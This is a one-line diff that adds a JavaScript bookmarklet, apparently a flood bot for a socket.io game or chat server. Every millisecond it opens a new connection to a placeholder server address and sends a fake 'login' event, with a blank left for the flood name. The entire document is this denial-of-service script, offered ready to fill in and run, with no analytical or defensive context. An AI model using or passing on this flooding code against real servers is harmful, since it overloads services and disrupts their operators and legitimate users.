@@ -1,0 +1,1 @@
+JavaScript:setInterval(function(){var sockets = []; var G = io("server link"); sockets.push(G);G.emit('login',{name:'instert flood name here'})},1);
